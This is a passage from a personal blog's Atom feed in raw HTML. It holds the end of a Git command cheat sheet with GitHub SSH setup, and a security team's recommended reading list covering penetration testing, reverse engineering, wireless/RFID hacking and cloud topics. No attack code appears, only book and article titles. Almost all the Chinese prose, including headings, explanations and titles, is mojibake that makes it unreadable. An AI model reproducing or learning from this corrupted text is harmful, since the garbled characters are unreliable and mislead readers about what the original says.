[remote]</span></span><br><span class="line"></span><br><span class="line">2.æ˜¾ç¤ºæ‰€æœ‰è¿œç¨‹ä»“åº“</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote -v</span></span><br><span class="line"></span><br><span class="line">3.æ˜¾ç¤ºæŸä¸ªè¿œç¨‹ä»“åº“çš„ä¿¡æ¯</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote show [remote]</span></span><br><span class="line"></span><br><span class="line">4.å¢åŠ ä¸€ä¸ªæ–°çš„è¿œç¨‹ä»“åº“ï¼Œå¹¶å‘½å</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote add [shortname] [url]</span></span><br><span class="line"></span><br><span class="line">5.å–å›è¿œç¨‹ä»“åº“çš„å˜åŒ–ï¼Œå¹¶ä¸æœ¬åœ°åˆ†æ”¯åˆå¹¶</span><br><span class="line"><span class="meta">$</span><span class="bash"> git pull [remote] [branch]</span></span><br><span class="line"></span><br><span class="line">6.ä¸Šä¼ æœ¬åœ°æŒ‡å®šåˆ†æ”¯åˆ°è¿œç¨‹ä»“åº“</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push [remote] [branch]</span></span><br><span class="line"></span><br><span class="line">7.å¼ºè¡Œæ¨é€å½“å‰åˆ†æ”¯åˆ°è¿œç¨‹ä»“åº“ï¼Œå³ä½¿æœ‰å†²çª</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push [remote] --force</span></span><br><span class="line"></span><br><span class="line">8.æ¨é€æ‰€æœ‰åˆ†æ”¯åˆ°è¿œç¨‹ä»“åº“</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push [remote] --all</span></span><br></pre></td></tr></table></figure><h2 id="0X09-æ—¶å…‰å›æº¯ç¯‡"><a href="#0X09-æ—¶å…‰å›æº¯ç¯‡" class="headerlink" title="0X09 æ—¶å…‰å›æº¯ç¯‡"></a>0X09 æ—¶å…‰å›æº¯ç¯‡</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1.æ¢å¤æš‚å­˜åŒºçš„æŒ‡å®šæ–‡ä»¶åˆ°å·¥ä½œåŒº</span><br><span class="line">$ git checkout [file]</span><br><span class="line"></span><br><span class="line">2.æ¢å¤æŸä¸ª<span class="keyword">commit</span>çš„æŒ‡å®šæ–‡ä»¶åˆ°æš‚å­˜åŒºå’Œå·¥ä½œåŒº</span><br><span class="line">$ git checkout [<span class="keyword">commit</span>] [<span class="keyword">file</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>æ¢å¤æš‚å­˜åŒºçš„æ‰€æœ‰æ–‡ä»¶åˆ°å·¥ä½œåŒº</span><br><span class="line">$ git checkout .</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>é‡ç½®æš‚å­˜åŒºçš„æŒ‡å®šæ–‡ä»¶ï¼Œä¸ä¸Šä¸€æ¬¡<span class="keyword">commit</span>ä¿æŒä¸€è‡´ï¼Œä½†å·¥ä½œåŒºä¸å˜</span><br><span class="line">$ git <span class="keyword">reset</span> [<span class="keyword">file</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>é‡ç½®æš‚å­˜åŒºä¸å·¥ä½œåŒºï¼Œä¸ä¸Šä¸€æ¬¡<span class="keyword">commit</span>ä¿æŒä¸€è‡´</span><br><span class="line">$ git <span class="keyword">reset</span> <span class="comment">--hard</span></span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>é‡ç½®å½“å‰åˆ†æ”¯çš„æŒ‡é’ˆä¸ºæŒ‡å®š<span class="keyword">commit</span>ï¼ŒåŒæ—¶é‡ç½®æš‚å­˜åŒºï¼Œä½†å·¥ä½œåŒºä¸å˜</span><br><span class="line">$ git <span class="keyword">reset</span> [<span class="keyword">commit</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>é‡ç½®å½“å‰åˆ†æ”¯çš„<span class="keyword">HEAD</span>ä¸ºæŒ‡å®š<span class="keyword">commit</span>ï¼ŒåŒæ—¶é‡ç½®æš‚å­˜åŒºå’Œå·¥ä½œåŒºï¼Œä¸æŒ‡å®š<span class="keyword">commit</span>ä¸€è‡´</span><br><span class="line">$ git <span class="keyword">reset</span> <span class="comment">--hard [commit]</span></span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>é‡ç½®å½“å‰<span class="keyword">HEAD</span>ä¸ºæŒ‡å®š<span class="keyword">commit</span>ï¼Œä½†ä¿æŒæš‚å­˜åŒºå’Œå·¥ä½œåŒºä¸å˜</span><br><span class="line">$ git <span class="keyword">reset</span> <span class="comment">--keep [commit]</span></span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>æ–°å»ºä¸€ä¸ª<span class="keyword">commit</span>ï¼Œç”¨æ¥æ’¤é”€æŒ‡å®š<span class="keyword">commit</span>ï¼Œåè€…çš„æ‰€æœ‰å˜åŒ–éƒ½å°†è¢«å‰è€…æŠµæ¶ˆï¼Œå¹¶ä¸”åº”ç”¨åˆ°å½“å‰åˆ†æ”¯</span><br><span class="line">$ git revert [<span class="keyword">commit</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span>æš‚æ—¶å°†æœªæäº¤çš„å˜åŒ–ç§»é™¤ï¼Œç¨åå†ç§»å…¥</span><br><span class="line">$ git stash</span><br><span class="line">$ git stash pop</span><br></pre></td></tr></table></figure><h1 id="äºŒã€Githubä¸ä¿¡ä»°"><a href="#äºŒã€Githubä¸ä¿¡ä»°" class="headerlink" title="äºŒã€Githubä¸ä¿¡ä»°"></a>äºŒã€Githubä¸ä¿¡ä»°</h1><p><img src="/posts/git/30.png" alt=""></p><ul><li>è¿™ä¸ªå‘¨ç›®æ˜¯å…³äºLinuxä¸‹gitæ—¶å…‰æœºçš„å®é™…åº”ç”¨ â€”â€” æŠŠå·²æœ‰é¡¹ç›®æ¨åˆ°Githubä¸Šã€‚     </li><li>Githubè´¦å·çš„åˆ›å»ºä¸gitçš„å®‰è£…é…ç½®ä¸å†ä½œè¯´æ˜ã€‚</li></ul><h2 id="1X01-è®¾ç½®Git"><a href="#1X01-è®¾ç½®Git" class="headerlink" title="1X01 è®¾ç½®Git"></a>1X01 è®¾ç½®Git</h2><p>è®¾ç½®ç”¨æˆ·åä¸emailï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global user.name <span class="string">"your name"</span></span><br><span class="line">git<span class="built_in"> config </span>--global user.email <span class="string">"youremail@lalala.com"</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åœ¨/homeä¸‹ä¼šæ–°å»ºä¸€ä¸ª<strong>.gitconfig</strong>æ–‡ä»¶</p><h2 id="1X02-é…ç½®SSH"><a href="#1X02-é…ç½®SSH" class="headerlink" title="1X02 é…ç½®SSH"></a>1X02 é…ç½®SSH</h2><p>1.åˆ›å»ºSSH Key</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen -t rsa -C <span class="string">"youremail@lalala.com"</span></span></span><br></pre></td></tr></table></figure><p>ç³»ç»Ÿä¼šæç¤ºkeyçš„ä¿å­˜ä½ç½®ï¼Œä¸€èˆ¬ä¸º~/.sshï¼Œæ¥ä¸‹æ¥ä¼šè¯·æ±‚è¾“å…¥å£ä»¤ï¼Œä¸€è·¯é»˜è®¤ï¼Œæ•²ä¸‰æ¬¡å›è½¦å³å¯ã€‚   </p><p>ç„¶åç™»é™†gayhub -&gt; Accounting settings -&gt; SSH key -&gt; Add SSH Key -&gt; å–ä¸ªå®¹æ˜“åŒºåˆ†çš„åå­— -&gt; æŠŠ~/.ssh/id_rsa.pubæ–‡ä»¶ä¸­çš„å†…å®¹ç²˜è´´ä¸Šå»å³å¯ã€‚</p><p>ç”¨ä¸‹é¢çš„å‘½ä»¤è¿›è¡Œæµ‹è¯•ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ssh</span> <span class="selector-tag">-T</span> <span class="selector-tag">git</span>@<span class="keyword">github</span>.<span class="keyword">com</span></span><br></pre></td></tr></table></figure><h2 id="1X03-push-and-pull-from-github"><a href="#1X03-push-and-pull-from-github" class="headerlink" title="1X03 push and pull from github"></a>1X03 push and pull from github</h2><p>1.åœ¨æ–°å»ºçš„~/My_Message_Boardç›®å½•ä¸­git cloneå·²å­˜åœ¨GitHubä¸Šçš„Repository</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">URL</span></span><br></pre></td></tr></table></figure><p>2.å…ˆä¿®æ”¹ä¸ªreadmeï¼Œæäº¤ã€‚</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo vi README.md</span><br><span class="line">git status</span><br><span class="line">git <span class="keyword">add</span><span class="bash"> README.md</span></span><br><span class="line"><span class="bash">git status</span></span><br><span class="line"><span class="bash">git commit -m <span class="string">"Cyris readme-change 5/17"</span></span></span><br><span class="line"><span class="bash">git status</span></span><br><span class="line"><span class="bash">git remote add origin URL</span></span><br></pre></td></tr></table></figure><p>æŠ¥äº†ä¸ªé”™ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fata<span class="variable">l:</span> remote origin already <span class="built_in">exists</span>.</span><br></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git remote rm origin</span></span><br></pre></td></tr></table></figure><p>å†æ¥ã€‚</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote <span class="built_in">add</span> origin <span class="built_in">URL</span>ï¼ˆè¿™äº›<span class="built_in">URL</span>éƒ½æ˜¯githubé‡Œå¤åˆ¶çš„<span class="built_in">URL</span>ï¼‰</span><br></pre></td></tr></table></figure><p>3.ä¸‹é¢æŠŠå®ƒpushä¸Šå»</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">push</span> -u <span class="built_in">origin</span> master</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šè¦æ±‚è¾“å…¥GitHubè´¦æˆ·çš„ç”¨æˆ·åå’Œå¯†ç ã€‚è¾“å…¥å³å¯ã€‚</p><p>4.æäº¤å®Œæˆï¼Œå»GitHubçœ‹çœ¼Repositoryã€‚å†…å®¹ä¿®æ”¹æˆåŠŸã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Akå¸ˆå‚…çš„å°ç¶ä¸Šè°ˆäº†äº›å…³äºgitçš„å¸¸è§ç”¨æ³•ï¼Œå›å»ä»¥ååšäº†äº›æ•´ç†ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Git" scheme="https://cyris.pen.moe/categories/Git/"/>
    
    
      <category term="GIT" scheme="https://cyris.pen.moe/tags/GIT/"/>
    
      <category term="Wiki" scheme="https://cyris.pen.moe/tags/Wiki/"/>
    
  </entry>
  
  <entry>
    <title>é­”æ³•ç¦ä¹¦ç›®å½•</title>
    <link href="https://cyris.pen.moe/posts/wiki/"/>
    <id>https://cyris.pen.moe/posts/wiki/</id>
    <published>2017-04-15T01:38:00.000Z</published>
    <updated>2018-02-14T13:39:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>vidar teamæ•´ç†çš„ä¸€ä»½æ¨èä¹¦å•ï¼Œå„ä¸ªæ–¹å‘å„ä¸ªé˜¶æ®µå‡æœ‰ã€‚  </p><a id="more"></a>  <h1 id="æ¨èå›¾ä¹¦ç›®å½•"><a href="#æ¨èå›¾ä¹¦ç›®å½•" class="headerlink" title="æ¨èå›¾ä¹¦ç›®å½•"></a>æ¨èå›¾ä¹¦ç›®å½•</h1><h2 id="æ¸—é€æ–¹å‘ï¼š"><a href="#æ¸—é€æ–¹å‘ï¼š" class="headerlink" title="æ¸—é€æ–¹å‘ï¼š"></a>æ¸—é€æ–¹å‘ï¼š</h2><h3 id="Â·-åŸºç¡€ç±»"><a href="#Â·-åŸºç¡€ç±»" class="headerlink" title="Â· åŸºç¡€ç±»"></a>Â· åŸºç¡€ç±»</h3><p>&#160; &#160; &#160; &#160;ã€ŠPHPåŸºç¡€æ•™ç¨‹.ç¬¬4ç‰ˆã€‹<br>&#160; &#160; &#160; &#160;ã€ŠPHPä¸MySQLæƒå¨æŒ‡å—ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠJavascriptæƒå¨æŒ‡å—ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠPythonåŸºç¡€æ•™ç¨‹ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠPython ç½‘ç»œç¼–ç¨‹ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠTCP/IPåè®®è¯¦è§£ ä¸‰å·ã€‹<br>&#160; &#160; &#160; &#160;ã€Šå›¾è§£TCP/IPã€‹<br>&#160; &#160; &#160; &#160;ã€ŠHTTPæƒå¨æŒ‡å—ã€‹<br>&#160; &#160; &#160; &#160;ã€Šå›¾è§£HTTPã€‹<br>&#160; &#160; &#160; &#160;ã€ŠHTTPåè®®è¯¦è§£ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠPythonç»æŠ€ï¼šè¿ç”¨Pythonæˆä¸ºé¡¶çº§é»‘å®¢ã€‹</p><h3 id="Â·-æ”»é˜²ç±»"><a href="#Â·-æ”»é˜²ç±»" class="headerlink" title="Â· æ”»é˜²ç±»"></a>Â· æ”»é˜²ç±»</h3><p>&#160; &#160; &#160; &#160;ã€Šç™½å¸½å­è®²WEBå®‰å…¨ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠWebå‰ç«¯ é»‘å®¢æŠ€æœ¯æ­ç§˜ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠKali Linux Web æ¸—é€æµ‹è¯•ã€‹<br>&#160; &#160; &#160; &#160;ã€Šé»‘å®¢æ”»é˜²æŠ€æœ¯å®å…¸Webå®æˆ˜ç¯‡ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠSQLæ³¨å…¥æ”»å‡»ä¸é˜²å¾¡ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠXSSè·¨ç«™è„šæœ¬æ”»å‡»å‰–æä¸é˜²å¾¡ã€‹<br>&#160; &#160; &#160; &#160;ã€Šå®‰å…¨å‚è€ƒç³»åˆ—ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠPythoné»‘å¸½å­ï¼šé»‘å®¢ä¸æ¸—é€æµ‹è¯•ç¼–ç¨‹ä¹‹é“ã€‹</p><h2 id="é€†å‘æ–¹å‘ï¼š"><a href="#é€†å‘æ–¹å‘ï¼š" class="headerlink" title="é€†å‘æ–¹å‘ï¼š"></a>é€†å‘æ–¹å‘ï¼š</h2><h3 id="Â·-åŸºç¡€ç±»ï¼ˆå»ºè®®æŒ‰é¡ºåºå­¦ä¹ ï¼‰"><a href="#Â·-åŸºç¡€ç±»ï¼ˆå»ºè®®æŒ‰é¡ºåºå­¦ä¹ ï¼‰" class="headerlink" title="Â· åŸºç¡€ç±»ï¼ˆå»ºè®®æŒ‰é¡ºåºå­¦ä¹ ï¼‰"></a>Â· åŸºç¡€ç±»ï¼ˆå»ºè®®æŒ‰é¡ºåºå­¦ä¹ ï¼‰</h3><p>&#160; &#160; &#160; &#160;ã€Šæ±‡ç¼–è¯­è¨€ã€‹<br>&#160; &#160; &#160; &#160;ã€Šæ±‡ç¼–è¯­è¨€ç¼–ç¨‹è‰ºæœ¯ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠWindowsç¯å¢ƒä¸‹32ä½æ±‡ç¼–è¯­è¨€ç¨‹åºè®¾è®¡-ç¢çŸ³æˆå™¨ ç¬¬3ç‰ˆã€‹<br>&#160; &#160; &#160; &#160;ã€ŠWINDOWSPEæƒå¨æŒ‡å—ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠC++åæ±‡ç¼–ä¸é€†å‘åˆ†ææŠ€æœ¯æ­ç§˜ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠWindowsç¨‹åºè®¾è®¡ã€‹<br>&#160; &#160; &#160; &#160;ã€Šé€†å‘å·¥ç¨‹å®æˆ˜ã€‹<br>&#160; &#160; &#160; &#160;ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç† ã€‹<br>&#160; &#160; &#160; &#160;ã€Šé€†å‘å·¥ç¨‹æ­å¯†/å®‰å…¨æŠ€æœ¯å¤§ç³»ä¸­æ–‡ç‰ˆã€‹<br>&#160; &#160; &#160; &#160;ã€ŠMalware analystâ€™s cookbookã€‹<br>&#160; &#160; &#160; &#160;ã€ŠPythonç°å¸½å­ï¼šé»‘å®¢ä¸é€†å‘å·¥ç¨‹å¸ˆçš„Pythonç¼–ç¨‹ä¹‹é“ã€‹</p><h3 id="Â·-è¿›é˜¶ç±»"><a href="#Â·-è¿›é˜¶ç±»" class="headerlink" title="Â· è¿›é˜¶ç±»"></a>Â· è¿›é˜¶ç±»</h3><p>&#160; &#160; &#160; &#160;ã€ŠåŠ å¯†ä¸è§£å¯†ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠWindows PEæƒå¨æŒ‡å—ã€‹<br>&#160; &#160; &#160; &#160;ã€Šæ¶æ„ä»£ç åˆ†æå®æˆ˜ã€‹<br>&#160; &#160; &#160; &#160;ã€Š0dayå®‰å…¨è½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹<br>&#160; &#160; &#160; &#160;ã€Šæ•°æ®ç»“æ„ã€‹ï¼ˆä¸¥è”šæ•è‘—ï¼‰</p><h2 id="Android-æ–¹å‘ï¼š"><a href="#Android-æ–¹å‘ï¼š" class="headerlink" title="Android æ–¹å‘ï¼š"></a>Android æ–¹å‘ï¼š</h2><h3 id="Â·-å¼€å‘"><a href="#Â·-å¼€å‘" class="headerlink" title="Â· å¼€å‘"></a>Â· å¼€å‘</h3><p>&#160; &#160; &#160; &#160;ã€Šç–¯ç‹‚JAVAè®²ä¹‰ã€‹<br>&#160; &#160; &#160; &#160;ã€Šç–¯ç‹‚Androidè®²ä¹‰ã€‹<br>&#160; &#160; &#160; &#160;ã€Šç¬¬ä¸€è¡Œä»£ç -Androidã€‹<br>&#160; &#160; &#160; &#160;ã€ŠAndroidç§»åŠ¨å¼€å‘ä¸€æœ¬å°±å¤Ÿäº†ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠAndroidåŸºç¡€æ•™ç¨‹ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠAndroid C++ é«˜çº§ç¼–ç¨‹-ä½¿ç”¨NDKã€‹<br>&#160; &#160; &#160; &#160;ã€ŠAndroidé©±åŠ¨å¼€å‘æƒå¨æŒ‡å—ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠAndroidè½¯ä»¶å®‰å…¨ä¸é€†å‘åˆ†æã€‹<br>&#160; &#160; &#160; &#160;ã€Šæ·±å…¥ç†è§£Android IIå·ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠAndroidå®‰å…¨æ”»é˜²å®æˆ˜ã€‹</p><h2 id="Windows-amp-Linux-æ–¹å‘ï¼š"><a href="#Windows-amp-Linux-æ–¹å‘ï¼š" class="headerlink" title="Windows&amp;Linux æ–¹å‘ï¼š"></a>Windows&amp;Linux æ–¹å‘ï¼š</h2><p>&#160; &#160; &#160; &#160;ã€ŠWindowsç¨‹åºè®¾è®¡ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠWindowsæ ¸å¿ƒç¼–ç¨‹ã€‹<br>&#160; &#160; &#160; &#160;ã€Šå¯’æ±Ÿç‹¬é’“Windowså†…æ ¸å®‰å…¨ç¼–ç¨‹ã€‹<br>&#160; &#160; &#160; &#160;ã€Šé¸Ÿå“¥çš„linuxç§æˆ¿èœåŸºç¡€ç¯‡+æœåŠ¡å™¨ç¯‡ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠLinuxå†…æ ¸ç²¾é«“ã€‹<br>&#160; &#160; &#160; &#160;ã€Šæ·±å…¥ç†è§£LINUXå†…æ ¸ã€‹</p><h2 id="ç½‘ç»œæ–¹å‘ï¼š"><a href="#ç½‘ç»œæ–¹å‘ï¼š" class="headerlink" title="ç½‘ç»œæ–¹å‘ï¼š"></a>ç½‘ç»œæ–¹å‘ï¼š</h2><p>&#160; &#160; &#160; &#160;ã€Šæ€ç§‘ç½‘ç»œæŠ€æœ¯å­¦é™¢æ•™ç¨‹CCNA Exploration: ç½‘ç»œåŸºç¡€çŸ¥è¯†ã€‹<br>&#160; &#160; &#160; &#160;ã€Šæ€ç§‘ ç½‘ç»œæŠ€æœ¯å­¦é™¢æ•™ç¨‹CCNA Exploration:è·¯ç”±åè®®å’Œæ¦‚å¿µã€‹<br>&#160; &#160; &#160; &#160;ã€Šå›¾è§£TCP/IPã€‹<br>&#160; &#160; &#160; &#160;ã€Šè®¡ç®—æœºç½‘ç»œã€‹ï¼ˆAndrew S.Tanenbaumè‘—ï¼‰<br>&#160; &#160; &#160; &#160;ã€ŠWiresharkæ•°æ®åŒ…åˆ†æå®æˆ˜ã€‹<br>&#160; &#160; &#160; &#160;ã€Šç½‘ç»œåˆ†ææŠ€æœ¯æ­ç§˜ã€‹</p><h2 id="æ— çº¿ç”µå®‰å…¨æ–¹å‘ï¼š"><a href="#æ— çº¿ç”µå®‰å…¨æ–¹å‘ï¼š" class="headerlink" title="æ— çº¿ç”µå®‰å…¨æ–¹å‘ï¼š"></a>æ— çº¿ç”µå®‰å…¨æ–¹å‘ï¼š</h2><p>&#160; &#160; &#160; &#160;ã€Šæ— çº¿ç½‘ç»œå®‰å…¨æ”»é˜²å®æˆ˜è¿›é˜¶ã€‹<br>&#160; &#160; &#160; &#160;ã€Šæ— çº¿ç”µå®‰å…¨æ”»é˜²å¤§æ­ç§˜ã€‹<br>&#160; &#160; &#160; &#160;ã€Šå°„é¢‘è¯†åˆ«(RFID)æ ¸å¿ƒæŠ€æœ¯è¯¦è§£ã€‹<br>&#160; &#160; &#160; &#160;ã€Šé»‘å®¢å¤§æ›å…‰ï¼šæ— çº¿ç½‘ç»œå®‰å…¨ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠBackTrack 5 Wireless Penetration Testing Beginnerâ€™s Guideã€‹</p><p>&#160; &#160; &#160; &#160;<strong>æ–‡ç« </strong>ï¼šï¼ˆå› ä¸ºå›¾ä¹¦æ¯”è¾ƒå°‘ï¼Œé‚ä»æŸå¤§ä½¬å¤„Getä¸€äº›æ¯”è¾ƒå¥½çš„æ¡ˆä¾‹åˆ†æï¼‰<br>&#160; &#160; &#160; &#160;ã€ŠRFID Hacking â‘£ : ProxMark3 ç ´è§£é—¨ç¦ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠRFID Hacking â‘¢ : ProxMark3 ä½¿ç”¨æ¡ˆä¾‹ï¼šå—…æ¢é“¶è¡Œé—ªä»˜å¡ä¿¡æ¯ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠHackRFå—…æ¢è“ç‰™é‡æ”¾iBeaconsä¿¡å·ã€‹<br>&#160; &#160; &#160; &#160;ã€Šæ°¸ä¸æ¶ˆé€çš„ç”µæ³¢ï¼ˆä¸‰ï¼‰ï¼šä½åŠŸè€—è“ç‰™ï¼ˆBLEï¼‰å…¥é—¨ä¹‹å¦‚ä½•è°ƒæˆåˆ«äººçš„å°ç±³æ‰‹ç¯ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠMousejack Hacking : åˆ©ç”¨MouseJackè¿›è¡Œç‰©ç†æ”»å‡»æµ…æã€‹<br>&#160; &#160; &#160; &#160;ã€ŠMouseJack Hacking æµ‹è¯•æŒ‡å—ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠBLE Hackingï¼šä½¿ç”¨Ubertoothoneæ‰«æå—…æ¢ä½åŠŸè€—è“ç‰™ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠRFID Hacking â€“ èµ„æºå¤§åˆé›†ã€‹</p><h2 id="æ–°æŠ€æœ¯ï¼ˆå®¹å™¨ã€äº‘ã€æœºå™¨å­¦ä¹ ç›¸å…³ï¼‰ï¼š"><a href="#æ–°æŠ€æœ¯ï¼ˆå®¹å™¨ã€äº‘ã€æœºå™¨å­¦ä¹ ç›¸å…³ï¼‰ï¼š" class="headerlink" title="æ–°æŠ€æœ¯ï¼ˆå®¹å™¨ã€äº‘ã€æœºå™¨å­¦ä¹ ç›¸å…³ï¼‰ï¼š"></a>æ–°æŠ€æœ¯ï¼ˆå®¹å™¨ã€äº‘ã€æœºå™¨å­¦ä¹ ç›¸å…³ï¼‰ï¼š</h2><h3 id="Â·-Docker"><a href="#Â·-Docker" class="headerlink" title="Â· Docker"></a>Â· Docker</h3><p>&#160; &#160; &#160; &#160;ã€Šç¬¬ä¸€æœ¬Dockerä¹¦ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠDockerå…¥é—¨å®æˆ˜ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠDockerå®¹å™¨ä¸å®¹å™¨äº‘ã€‹<br>&#160; &#160; &#160; &#160;ã€ŠDockerå¼€å‘å®è·µã€‹</p><h3 id="Â·-æœºå™¨å­¦ä¹ "><a href="#Â·-æœºå™¨å­¦ä¹ " class="headerlink" title="Â· æœºå™¨å­¦ä¹ "></a>Â· æœºå™¨å­¦ä¹ </h3><p>&#160; &#160; &#160; &#160;ã€Šæœºå™¨å­¦ä¹ ã€‹<br>&#160; &#160; &#160; &#160;ã€Šæ·±å…¥æµ…å‡ºæ•°æ®åˆ†æã€‹<br>&#160; &#160; &#160; &#160;ã€Šå•¤é…’ä¸å°¿å¸ƒã€‹<br>&#160; &#160; &#160; &#160;ã€Šé›†ä½“æ™ºæ…§ç¼–ç¨‹ã€‹<br>&#160; &#160; &#160; &#160;ã€Šç»Ÿè®¡å­¦ä¹ æ–¹æ³•ã€‹</p><h3 id="Â·-äº‘è®¡ç®—"><a href="#Â·-äº‘è®¡ç®—" class="headerlink" title="Â· äº‘è®¡ç®—"></a>Â· äº‘è®¡ç®—</h3><p>&#160; &#160; &#160; &#160;ã€Šäº‘è®¡ç®—ï¼šæ¦‚å¿µã€æŠ€æœ¯ä¸æ¶æ„ã€‹<br>&#160; &#160; &#160; &#160;ã€Šæ·±å…¥ç†è§£äº‘è®¡ç®—ï¼šåŸºæœ¬åŸç†å’Œåº”ç”¨ç¨‹åºç¼–ç¨‹æŠ€æœ¯ã€‹<br>&#160; &#160; &#160; &#160;ã€Šäº‘æ•°æ®ä¸­å¿ƒæ„å»ºå®æˆ˜ï¼šæ ¸å¿ƒæŠ€æœ¯ã€è¿ç»´ç®¡ç†ã€å®‰å…¨ä¸é«˜å¯ç”¨ã€‹<br>&#160; &#160; &#160; &#160;ã€Šäº‘è®¡ç®—æ ¸å¿ƒæŠ€æœ¯å‰–æã€‹<br>&#160; &#160; &#160; &#160;ã€Šå®æˆ˜Hadoopã€‹</p><ul><li>å¦å¤–é™„ä¸Šåä¼š<a href="https://wiki.vidar.club/doku.php?id=start" target="_blank" rel="noopener">wiki</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;vidar teamæ•´ç†çš„ä¸€ä»½æ¨èä¹¦å•ï¼Œå„ä¸ªæ–¹å‘å„ä¸ªé˜¶æ®µå‡æœ‰ã€‚  &lt;/p&gt;
    
    </summary>
    
      <category term="å­¦ä¹ èµ„æ–™" scheme="https://cyris.pen.moe/categories/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/"/>
    
    
      <category term="Wiki" scheme="https://cyris.pen.moe/tags/Wiki/"/>
    
  </entry>
  
  <entry>
    <title>ç»¿ç”Ÿ</title>
    <link href="https://cyris.pen.moe/posts/acaleph/"/>
    <id>https://cyris.pen.moe/posts/acaleph/</id>
    <published>2017-04-04T08:19:49.000Z</published>
    <updated>2018-04-01T06:41:19.000Z</updated>
    
